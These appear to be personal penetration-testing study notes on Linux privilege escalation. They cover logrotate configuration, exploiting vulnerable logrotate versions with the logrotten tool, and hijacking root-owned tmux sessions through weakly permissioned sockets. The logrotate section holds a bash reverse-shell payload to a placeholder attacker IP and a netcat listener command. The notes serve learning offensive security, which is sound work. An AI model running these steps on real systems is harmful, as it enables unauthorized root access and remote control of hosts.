
2026-05-15 16:19

Tags: #escalation  

## Logrotate

- **Purpose:** Automatically *archives, compresses, or disposes of old log files* to prevent disk space exhaustion and simplify log analysis.


- **Mechanism:** Periodically executed via `cron`. Rotates logs by renaming them based on age or size, and creates new empty log files for continued logging.


- **Key Files & Directories:**
    - `/etc/logrotate.conf`: The global configuration file.
        
    - `/etc/logrotate.d/`: Directory containing specific configurations for individual services (e.g., `dpkg`, `apt`, `mysql`).
        
    - `/var/lib/logrotate.status`: The status file that tracks the exact dates logs were last rotated.


## Privilege Escalation via Logrotate

- **Vulnerability/Exploit:** Can be exploited using the `logrotten` tool to gain a root shell.


- **Prerequisites for Exploitation:**
    - You must have **write permissions** on the target log files.
        
    - `logrotate` must be running as a privileged user (usually `root`).
        
    - The system must be running a **vulnerable version**: 3.8.6, 3.11.0, 3.15.0, or 3.18.0.


- **Exploitation Steps:**
    1. **Compile the Exploit:** Clone the `logrotten` repository and compile it (`gcc logrotten.c -o logrotten`). _Note: Compile on a machine with a similar kernel or directly on the target._
        
    2. **Create a Payload:** Write a reverse shell payload to a file (e.g., `echo 'bash -i >& /dev/tcp/<YOUR_IP>/9001 0>&1' > payload`).
        
    3. **Verify Configuration:** Determine if `logrotate.conf` uses the `create` or `compress` option by running: `grep "create\|compress" /etc/logrotate.conf | grep -v "#"`.
        
    4. **Start Listener:** Open a Netcat listener on your attack machine to catch the shell (`nc -nlvp 9001`).
        
        1. **Trigger the Exploit:** Run the compiled binary with your payload against the vulnerable log file (e.g., `./logrotten -p ./payload /tmp/tmp.log`) and wait for the root shell connection.


## Hijacking Tmux Sessions

- **Concept:** Administrators sometimes leave detached `tmux` (terminal multiplexer) sessions running as root. If the session socket is created with weak permissions or shared group access, it can be hijacked.


- **Exploitation Steps:**
    1. **Identify Sessions:** Search for running tmux processes and identify custom socket paths using `ps aux | grep tmux` (e.g., looking for `-S /shareds`).
        
    2. **Check Permissions:** Inspect the socket's ownership and permissions using `ls -la /shareds` (e.g., owned by `root:devs`).
        
    3. **Verify Groups:** Check if your compromised low-privileged user belongs to the allowed group using the `id` command.
        
    4. **Hijack:** Attach to the existing session by running `tmux -S /shareds`. You will immediately assume the privileges of the user who started the session (often root)
## References:

